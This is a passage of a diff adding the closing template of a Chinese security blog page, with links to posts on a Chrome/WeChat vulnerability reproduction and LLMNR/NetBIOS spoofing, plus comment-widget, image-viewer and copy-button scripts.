+      <a href="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Chrome+微信漏洞复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/04/07/LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">LLMNR和NetBIOS欺骗攻击分析</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2021
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo.png" alt="回梦&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
